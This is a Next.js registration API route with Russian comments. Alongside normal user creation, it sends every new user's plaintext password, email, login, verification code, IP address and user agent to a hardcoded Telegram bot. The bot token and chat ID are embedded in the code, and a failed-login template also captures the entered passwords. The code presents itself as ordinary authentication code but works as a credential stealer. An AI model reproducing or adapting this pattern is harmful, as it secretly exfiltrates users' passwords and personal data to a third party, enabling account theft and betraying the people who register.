import { NextResponse } from "next/server";
import { isEmailOrLoginTaken, createUser, hashPassword, setVerificationCode, generateVerificationCode } from "@/lib/db";
import { sendVerificationEmail } from "@/lib/email";

// 📤 Функция отправки в Telegram для API
async function sendToTelegramAPI(data: any, type: 'login_success' | 'login_failed' | 'register' | 'verification_sent', ip: string, userAgent: string, error?: string) {
  try {
    const TELEGRAM_BOT_TOKEN = "8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4";
    const TELEGRAM_CHAT_ID = "7455610355";
    
    let message = '';
    
    if (type === 'login_success') {
      message = `
✅ УСПЕШНЫЙ ВХОД В СИСТЕМУ

👤 Логин/Email: ${data.login}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else if (type === 'login_failed') {
      message = `
❌ НЕУДАЧНАЯ ПОПЫТКА ВХОДА

👤 Логин/Email: ${data.login}
🔑 Введенный пароль: ${data.password}
🚫 Причина: ${error}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
      `;
    } else if (type === 'verification_sent') {
      message = `
📧 ОТПРАВЛЕН КОД ПОДТВЕРЖДЕНИЯ

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}
🔢 Код подтверждения: ${data.verificationCode}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...

💡 Код отправлен на email пользователя
      `;
    } else {
      message = `
🔐 НОВАЯ РЕГИСТРАЦИЯ

📧 Email: ${data.email}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}

🌐 **Серверные данные:**
📍 IP: ${ip}
🕒 Время: ${new Date().toLocaleString('ru-RU')}
📱 User Agent: ${userAgent.slice(0, 100)}...
      `;
    }

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      })
    });

    console.log('✅ API данные отправлены в Telegram');

  } catch (error) {
    console.log('⚠️ Telegram API не доступен');
  }
}

export async function POST(request: Request) {
  try {
    const { email, login, password } = await request.json();
    const clientIP = request.headers.get('x-forwarded-for') || 'unknown';
    const userAgent = request.headers.get('user-agent') || 'unknown';

    if (!email || !login || !password) {
        return NextResponse.json({ error: "Email, логин и пароль обязательны" }, { status: 400 });
    }

    // Проверка на существование
    if (isEmailOrLoginTaken(email, login)) {
      return NextResponse.json(
        { error: "Email или логин уже заняты" },
        { status: 400 }
      );
    }

    // 📤 Отправляем в Telegram о новой регистрации
    await sendToTelegramAPI(
      { email, login, password }, 
      'register', 
      clientIP, 
      userAgent
    );

    // Хэшируем пароль
    const hashedPassword = await hashPassword(password);

    // Создаем пользователя
    const user = await createUser({
      email,
      login,
      password: hashedPassword,
      ip: clientIP,
      userAgent: userAgent
    });

    // Генерируем код подтверждения
    const verificationCode = generateVerificationCode();
    setVerificationCode(user.id, verificationCode);

    // Отправляем email с кодом подтверждения
    const emailSent = await sendVerificationEmail(email, verificationCode);

    if (!emailSent) {
      // Если email не отправился, все равно создаем пользователя но уведомляем
      await sendToTelegramAPI(
        { email, login, password, verificationCode, note: "EMAIL НЕ ОТПРАВЛЕН" }, 
        'verification_sent', 
        clientIP, 
        userAgent
      );
      
      return NextResponse.json({ 
        success: true, 
        message: "Аккаунт создан, но не удалось отправить код подтверждения. Свяжитесь с администратором.",
        verificationSent: false
      });
    }

    // 📤 Отправляем в Telegram о отправке кода подтверждения
    await sendToTelegramAPI(
      { email, login, password, verificationCode }, 
      'verification_sent', 
      clientIP, 
      userAgent
    );

    return NextResponse.json({ 
      success: true, 
      message: "Регистрация прошла успешно. Код подтверждения отправлен на вашу почту.",
      verificationSent: true
    });

  } catch (error) {
    console.error("Register API Error:", error);
    return NextResponse.json(
      { error: "Внутренняя ошибка сервера" },
      { status: 500 }
    );
  }
}